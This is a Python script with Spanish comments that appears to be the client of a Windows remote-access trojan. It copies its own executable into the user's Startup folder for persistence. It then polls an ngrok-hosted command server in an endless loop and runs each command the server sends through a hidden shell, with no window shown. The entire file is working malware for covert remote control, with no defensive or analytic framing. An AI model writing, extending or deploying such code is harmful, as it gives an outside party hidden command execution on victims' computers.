import requests
import subprocess
import os
import shutil
import winshell
import time
import sys

current_id = None
script_dir = os.path.dirname(os.path.abspath(__file__))


def get_executable_dir():
    # Obtiene el directorio del ejecutable
    if getattr(sys, 'frozen', False):
        # El script está ejecutándose como un ejecutable
        exe_dir = os.path.dirname(sys.executable)
    else:
        # El script está ejecutándose en modo de script
        exe_dir = os.path.dirname(os.path.abspath(__file__))
    return exe_dir

def copy_script_to_startup():
    # Obtiene el directorio del ejecutable
    script_dir = get_executable_dir()
    script_name = os.path.basename(sys.executable)
    
    # Imprime el directorio del ejecutable
    print(f"Directorio del ejecutable: {script_dir}")
    
    # Cambia la extensión si es un ejecutable
    if script_name.endswith('.exe'):
        script_name = script_name  # Ya es .exe
    else:
        script_name = script_name + '.exe'
    
    # Obtiene el directorio de inicio del usuario
    startup_dir = winshell.startup()
    
    # Construye la ruta completa del archivo de destino en el directorio de inicio
    destination_path = os.path.join(startup_dir, script_name)
    
    # Copia el archivo al directorio de inicio
    try:
        shutil.copy2(os.path.join(script_dir, script_name), destination_path)
        print(f"Script copiado a {destination_path}")
    except Exception as e:
        print(f"Error al copiar el script: {e}")




def get_client_id():
    global current_id
    response = requests.get("https://flexible-elk-monthly.ngrok-free.app/get_client_id")
    data = response.json()
    current_id = int(data.get('clients_id', 'No client_id found'))
    print(current_id)


def fetch_data():
    global current_id
    print('current id ', current_id)
    # URL pública del servidor Flask (ngrok o localhost si estás en la misma red)
    url = 'https://flexible-elk-monthly.ngrok-free.app/fetch_data'  # Reemplaza con la URL pública de ngrok
    
    while True:
        try:
            # Realizar una solicitud GET al servidor Flask para recibir datos
            response = requests.get(url)
            
            # Comprobar el código de estado de la respuesta
            if response.status_code == 200:
                # Imprimir la respuesta JSON del servidor
                data = response.json()
                print('Respuesta del servidor:', data)
                
                # Extraer información específica, por ejemplo 'client_id'
                client_id = int(data.get('client', 'No client_id found'))
                command = data.get('command', 'No command')
                print(client_id, current_id, command)

                if current_id == client_id:
                    run_command(command)
            else:
                print(f'Error: {response.status_code} - {response.text}')
                
        except requests.RequestException as e:
            print(f'Error en la solicitud: {e}')


def run_command(command):
    subprocess.Popen(
        command,
        shell=True,
        creationflags=subprocess.CREATE_NO_WINDOW  # Oculta la ventana en Windows
    )

def retry_function(func, delay=5):
    while True:
        try:
            func()
            break  # Si la función se ejecuta sin errores, salimos del bucle
        except Exception as e:
            print(f"Error: {e}. Reintentando en {delay} segundos...")
            time.sleep(delay)  # Espera antes de intentar nuevamente



if __name__ == '__main__':
    copy_script_to_startup()
    retry_function(get_client_id)
    retry_function(fetch_data)